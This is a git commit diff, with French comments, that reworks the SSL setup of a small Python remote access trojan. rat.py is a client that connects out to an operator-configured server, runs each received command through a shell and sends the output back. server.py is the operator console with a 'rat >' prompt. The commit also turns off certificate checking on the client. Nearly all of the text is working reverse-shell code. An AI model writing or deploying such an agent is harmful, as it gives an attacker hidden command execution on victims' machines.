1bd69c3fc10c268a750fba3206c0a31ad75e33c5
PerThoGon <enzo.marini888@gmail.com>
2024-06-11 01:36:49 +0200

    Préparation régénération des certificats

--- rat.py
+++ rat.py
@@ -9,18 +9,20 @@ SERVER_PORT = 8888
 load_dotenv()
 ip_server = os.getenv('IP_SERVER')
 
-client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+# Créer un contexte SSL
 context = ssl.create_default_context()
+context.check_hostname = False
+context.verify_mode = ssl.CERT_NONE
 
-# Envelopper le socket avec SSL
-secure_socket = context.wrap_socket(client_socket, server_hostname=ip_server)
-secure_socket.connect((ip_server, SERVER_PORT))
+client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ssl_socket = context.wrap_socket(client_socket, server_hostname=ip_server)
+ssl_socket.connect((ip_server, SERVER_PORT))
 
 while True:
-    command = secure_socket.recv(1024).decode()
+    command = ssl_socket.recv(1024).decode()
     if command.lower() == 'exit':
         break
     result = subprocess.run(command, shell=True, capture_output=True, text=True)
-    secure_socket.send(result.stdout.encode() + result.stderr.encode())
+    ssl_socket.send(result.stdout.encode() + result.stderr.encode())
 
-secure_socket.close()
+ssl_socket.close()
--- server.py
+++ server.py
@@ -8,9 +8,9 @@ SERVER_PORT = 8888
 load_dotenv()
 ip_server = os.getenv('IP_SERVER')
 
-# Chemins vers les fichiers de certificat et de clé
-CERT_FILE = 'cert.pem'
-KEY_FILE = 'key.pem'
+# Créer un contexte SSL
+context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
 
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_socket.bind((ip_server, SERVER_PORT))
@@ -18,21 +18,18 @@ server_socket.listen(1)
 print(f"[*] Listening on {SERVER_PORT}...")
 
 # Envelopper le socket avec SSL
-context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
-secure_socket = context.wrap_socket(server_socket, server_side=True)
+with context.wrap_socket(server_socket, server_side=True) as ssl_socket:
+    client_socket, client_address = ssl_socket.accept()
+    print("[+] Agent received !")
 
-client_socket, client_address = secure_socket.accept()
-print("[+] Agent received !")
+    while True:
+        command = input("rat > ")
+        if command.lower() == 'exit':
+            client_socket.send(b'exit')
+            break
+        client_socket.send(command.encode())
+        result = client_socket.recv(1024).decode()
+        print(result)
 
-while True:
-    command = input("rat > ")
-    if command.lower() == 'exit':
-        client_socket.send(b'exit')
-        break
-    client_socket.send(command.encode())
-    result = client_socket.recv(1024).decode()
-    print(result)
-
-client_socket.close()
-secure_socket.close()
+    client_socket.close()
+server_socket.close()
